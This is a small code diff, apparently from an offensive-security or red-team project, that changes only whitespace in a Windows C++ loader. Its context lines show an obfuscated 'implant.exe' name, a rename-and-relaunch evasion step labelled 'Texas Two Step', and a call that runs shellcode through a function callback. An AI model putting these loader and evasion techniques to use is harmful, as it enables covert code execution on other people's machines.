@@ -74,7 +74,7 @@ int main(int argc, char* argv[])
 	LPSTR out = NULL;
 
 	const char sImplant[] = { 'i', 'm', 'p', 'l', 'a', 'n', 't', '.', 'e', 'x', 'e', 0x0 };
-	
+
 	PDWORD old_protect = (PDWORD) PAGE_READWRITE;
 
 	//Check executable name
@@ -86,7 +86,7 @@ int main(int argc, char* argv[])
 	//std::cout << out << std::endl;
 
 	switch (rv) {
-	default:										
+	default:
 		//Texas Two Step, step 1. "safe" functionality
 		rename(lpFileName, out);
 		//Call new instance
@@ -125,7 +125,7 @@ int main(int argc, char* argv[])
 		//set execution function call
 		Sei.MethodEnum = E_CDEFFOLDERMENU_CREATE2;
 
-		//execute via function 
+		//execute via function
 		ShellcodeExecutionViaFunctionCallbackMain(&Sei);
 		break;
 
